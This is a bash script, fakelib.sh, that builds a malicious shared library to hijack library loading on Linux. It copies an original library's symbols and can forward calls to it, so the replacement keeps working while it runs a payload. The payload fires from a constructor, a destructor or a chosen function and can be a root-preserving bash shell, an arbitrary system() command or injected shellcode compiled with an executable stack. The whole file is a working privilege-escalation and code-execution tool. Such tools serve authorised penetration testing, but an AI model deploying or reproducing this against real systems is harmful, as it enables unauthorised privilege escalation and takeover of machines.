#!/bin/bash

# Check if gcc is present
if [[ ! -r /usr/bin/gcc ]] ; then
	echo "ERROR: gcc must be present in the system to run fakelib.sh" 1>&2
	exit 1
fi

# Check if readelf is present
if [[ ! -r /usr/bin/readelf ]] ; then
	echo "ERROR: readelf must be present in the system to run fakelib.sh" 1>&2
	exit 1
fi

# Arguments
while getopts o:l:t:a:m:f:p:c:s:kgvh opt ; do
	case "$opt" in
		# Output file
		o) output="$OPTARG";;
		# Original library
		l) library="$OPTARG";;
		# Target library path
		t) target="$OPTARG";;
		# Architecture
		a) archopt="$OPTARG";;
		# Execution method
		m) method="$OPTARG";;
		# Function to inject payload
		f) func="$OPTARG";;
		# Payload
		p) payload="$OPTARG";;
		# Custom command
		c) comm="$OPTARG";;
		# Custom shellcode
		s) shellcode="$OPTARG";;
		# Fork payload
		k) fork=true;;
		# Generate links to original lib
		g) generate=true;;
		# Print output library
		v) verbose=true;;
		# Print help
		h) print_help=true;;
		# No argument error
		:) print_help=true;;
		# Unknown option
    		*) print_help=true;;
	esac
done

if [[ -n $print_help ]] ; then
	echo "Usage: fakelib.sh [-o <output_lib>] [-l <original_lib>] [-t <target_lib>]"
        echo "                  [-a <arch>] [-m <method>] [-f <function>] [-p <payload>]"
	echo "                  [-c <command>] [-s <shellcode>] [-f] [-g] [-v] [-h]"
	echo
	echo "  -o <output_lib>: output with fake library"
	echo "  -l <original_lib>: original library to emulate"
	echo "  -t <target_lib>: original library path to load with dlopen"
	echo "                   (use if it's not the same as the -l parameter value)"
	echo "  -a <arch>: \"32\" or \"64\" (default)"
	echo "  -m <method>: payload execution method. Available methods:"
	echo "    constructor: run payload in constructor method (default)"
	echo "    destructor: run payload in destructor method"
        echo "                (WARNING, payload may not be executed)"
	echo "    custom: run payload in custom function (use -f flag)"
        echo "            (WARNING, may break functionality in 32 bits)"
	echo "  -f <function>: function to inject payload (with method \"custom\")"
	echo "  -p <payload>: payload that the library will run. Available payloads:"
	echo "    echo: print test message (default)"
	echo "    bash: run bash setting uid/gid to euid/egid"
	echo "    system: run custom command (use -c flag)"
	echo "    custom: run custom shellcode (use -s flag)"
	echo "  -c <custom command>: command to run with payload \"system\""
	echo "  -s <shellcode>: shellcode to run with payload \"custom\""
        echo "                  Must be inside quotes in C string format"
	echo "  -f: fork and run payload in child process"
	echo "  -g: generate links to original library to preserve functionality"
        echo "      (WARNING, doesn't always work)"
	echo "  -v: verbose. Print fake library source code"
	echo "  -h: print this help"
	echo
	exit 1
fi

# Architecture checks
if [[ -n $archopt ]] ; then
	case "$archopt" in
		32) arch=ELF32;;
		64) arch=ELF64;;
		*) echo "ERROR: architecture must be \"32\" or \"64\"" 1>&2; exit 1;;
	esac
fi

# Output file checks
if [[ -z $output ]] ; then
	if [[ -z $library ]] ; then
		output="libfake.so"
	else
		output="./`basename $library`"
	fi
fi

# Original library checks
if [[ -z $library ]] ; then
	if [[ -n $generate ]] ; then
		echo "ERROR: -g option requires original library (-l <library>)" 1>&2
		exit 1
	fi
	echo "WARNING: original library not specified, no symbols will be exported" 1>&2
else
	if [[ ! -r $library ]] ; then
		echo "ERROR: library $library not found" 1>&2
		exit 1
	fi
        if [[ -r /usr/bin/realpath && "`realpath $output`" == "`realpath $library`" ]] ; then
		echo "ERROR: input and output library are the same" 1>&2
		exit 1
	fi
	res=`/usr/bin/readelf -h $library`
	if [[ $? -ne 0 ]] ; then
		echo "ERROR: obtaining library architecture" 1>&2
		exit 1
	fi
 	arch=`echo "$res" | awk '$1 =="Class:" {print$2}'`
	if [[ -n $archopt ]] ; then
		echo "WARNING: ignoring provided arch, using original library ($arch)" 1>&2
	fi
fi

# Target library checks
if [[ -n $target ]] ; then
	if [[ -z $generate ]] ; then
		echo "WARNING: ignoring target library, use generate option (-g)" 1>&2
	fi
fi

# Execution method checks
if [[ -z $method ]] ; then
	method="constructor"
else
	case "$method" in
		constructor) ;;
		destructor) ;;
		custom) ;;
		*) echo "ERROR: method must be \"constructor\", \"destructor\" or \"custom\"" 1>&2; exit 1 ;;
	esac
fi
if [[ -z "$func" && "$method" == "custom" ]] ; then
	echo "ERROR: method custom requires a function (-f <function>)" 1>&2
	exit 1
fi
if [[ -n "$func" && "$method" != "custom" ]] ; then
	echo "WARNING: ignoring provided function (use method \"custom\")" 1>&2
fi

# Payload checks
if [[ -z $payload ]] ; then
	payload="echo"
fi
if [[ -z "$comm" && "$payload" == "system" ]] ; then
	echo "ERROR: payload system requires a command (-c <command>)" 1>&2
	exit 1
fi
if [[ -n "$comm" && "$payload" != "system" ]] ; then
	echo "WARNING: ignoring provided command (use payload \"system\")" 1>&2
fi
if [[ -z "$shellcode" && "$payload" == "custom" ]] ; then
	echo "ERROR: payload custom requires a shellcode (-s <shellcode>)" 1>&2
	exit 1
fi
if [[ -n "$shellcode" && "$payload" != "custom" ]] ; then
	echo "WARNING: ignoring provided shellcode (use payload \"custom\")" 1>&2
fi
case "$payload" in
	echo) payload='printf("Library hijacked!\\n");' ;;
	bash) payload='setreuid(geteuid(), geteuid()); setregid(getegid(), getegid()); system("/bin/bash");' ;;
	system) payload="system(\"$comm\");" ;;
	custom) shellcode=`echo "$shellcode" | sed 's/\\\\/\\\\\\\\/g'` ; payload="char shellcode[]=\"$shellcode\"; (*(void(*)()) shellcode)();" ;;
	*) echo "ERROR: payload must be \"echo\", \"bash\", \"system\" or \"custom\"" 1>&2; exit 1 ;;
esac

# Fork and run payload in child process
if [[ -n $fork ]] ; then
	payload="if (fork() == 0) { $payload; exit(0);};"
fi

# Create tmp file for source code
if [[ -r /usr/bin/mktemp ]] ; then
	temp=`/usr/bin/mktemp --suffix .c`
else
	temp="/tmp/tmp.fakelib.c"
fi

# Delete old tmp files
if [[ -r $temp ]] ; then
	rm $temp
	if [[ $? -ne 0 ]] ; then
		echo "ERROR: couldn't delete $temp tmp file (already existing?)" 1>&2
		exit 1
	fi
fi
if [[ -r $temp.map ]] ; then
	rm $temp.map
	if [[ $? -ne 0 ]] ; then
		echo "ERROR: couldn't delete $temp.map tmp file (already existing?)" 1>&2
		exit 1
	fi
fi

# Insert headers in source code
required_libs="dlfcn.h stdio.h stdlib.h unistd.h"
for lib in $required_libs ; do
	echo "#include <$lib>" >> $temp
done

# Read original library symbols and define handle/function address pointers
if [[ -n $library ]] ; then
	objects=`/usr/bin/readelf --dyn-syms --wide $library | awk '$4 == "OBJECT" && $7 ~ "[0-9]+" {print$8}' | sed 's/@.*//' | sort -u`
	funcs=`/usr/bin/readelf --dyn-syms --wide $library | awk '$4 == "FUNC" && $7 ~ "[0-9]+" {print$8}' | sed 's/@.*//' | grep -vE '^(_init|_fini)$' | sort -u`
	if [[ -n $generate ]] ; then
		echo "void *handle;" >> $temp
		for f in $funcs ; do
			echo "void (*addr_$f)();" >> $temp
		done
		for o in $objects ; do
			echo "void *$o;" >> $temp
		done
	fi
fi

# Function with payload
echo "void *fakelib_payload() {" >> $temp
echo -e "\t$payload" >> $temp
echo "}" >> $temp

# Constructor method
echo "void __attribute__ ((constructor)) fakelib_init(void);" >> $temp
echo "void fakelib_init() {" >> $temp
# Unset env var LD_PRELOAD to avoid endless loops calling the constructor function with "system" payloads
echo -e "\tunsetenv(\"LD_PRELOAD\");" >> $temp
# Populate handle/function address pointers
if [[ -n $generate ]] ; then
	if [[ -n $target ]] ; then
		echo -e "\thandle = dlopen(\"$target\", RTLD_LAZY | RTLD_DEEPBIND );" >> $temp
	else
		echo -e "\thandle = dlopen(\"$library\", RTLD_LAZY | RTLD_DEEPBIND );" >> $temp
	fi
	for f in $funcs ; do
		echo -e "\taddr_$f = dlsym(handle, \"$f\");" >> $temp
	done
	for o in $objects ; do
		echo -e "\t$o = dlsym(handle, \"$o\");" >> $temp
	done
fi
# Include payload
if [[ "$method" == "constructor" ]] ; then
	echo -e "\tfakelib_payload();" >> $temp
fi
echo "};" >> $temp

# Destructor method with payload
if [[ "$method" == "destructor" ]] ; then
	echo "void __attribute__ ((destructor)) fakelib_fini(void);" >> $temp
	echo "void fakelib_fini() {" >> $temp
	echo -e "\tfakelib_payload();" >> $temp
	echo "}" >> $temp
fi

# Create original library method definitions
if [[ -n $library ]] ; then
	if [[ $arch == "ELF32" ]] ; then
		bp_reg="ebp"
	else
		bp_reg="rbp"
	fi
	for f in $funcs ; do
		echo "void *$f() {" >> $temp
		# Include payload in custom method
		if [[ "$f" == "$func" ]] ; then
			if [[ $arch != "ELF32" ]] ; then
				# Push registers before calling payload function so original functionality isn't lost
				echo -e "\tasm volatile (\"push %rdi; push %rsi; push %rdx; push %rcx; push %r8; push %r9\");" >> $temp
			fi
			echo -e "\tfakelib_payload();" >> $temp
			if [[ $arch != "ELF32" ]] ; then
				# Pop original registers
				echo -e "\tasm volatile (\"pop %r9; pop %r8; pop %rcx; pop %rdx; pop %rsi; pop %rdi\");" >> $temp
			fi
		fi
		# Create jumps to the original library functions
		if [[ -n $generate ]] ; then
			echo -e "\tasm volatile (\"pop %%$bp_reg\\\n\\\tjmp *%0\" : : \"r\" (addr_$f));" >> $temp
		fi
		echo "};" >> $temp
	done
fi

# Include custom function (if not existing on the original library)
if [[ -n $func ]] ; then
	echo "$funcs" | grep $func >&/dev/null
	if [[ $? -ne 0 ]] ; then
		echo "void *$func() {" >> $temp
		echo -e "\tfakelib_payload();" >> $temp
		echo "};" >> $temp
	fi
fi

# Print source code
if [[ -n $verbose ]] ; then
	echo "/*** Fake library source code ***/"
	cat $temp
fi

# Get symbols versions
if [[ -n $library ]] ; then
	versions=`/usr/bin/readelf --dyn-syms --wide $library | awk '$7 ~ "[0-9]+" {print$8}' | grep "@@" | sed 's/^.*@@//' | sort -u`
	for v in $versions ; do
		echo "$v {" >> $temp.map
		/usr/bin/readelf --dyn-syms --wide $library | awk '$7 ~ "[0-9]+" {print$8}' | grep "@@$v$" | sed "s/@@$v$/;/" >> $temp.map
		echo "};" >> $temp.map
	done
fi

# Library compilation
echo "Generating fake library under $output" 1>&2
if [[ $arch == "ELF32" ]] ; then
	arch_flag="-m32"
else
	arch_flag="-m64"
fi
if [[ -z "$versions" ]] ; then
	/usr/bin/gcc $arch_flag -zexecstack -Wl,--no-as-needed -shared -fpic -ldl -o $output $temp
else
	/usr/bin/gcc $arch_flag -zexecstack -Wl,--no-as-needed -shared -fpic -ldl -Wl,--version-script=$temp.map -o $output $temp
fi

# Delete temp files
rm -f $temp $temp.map
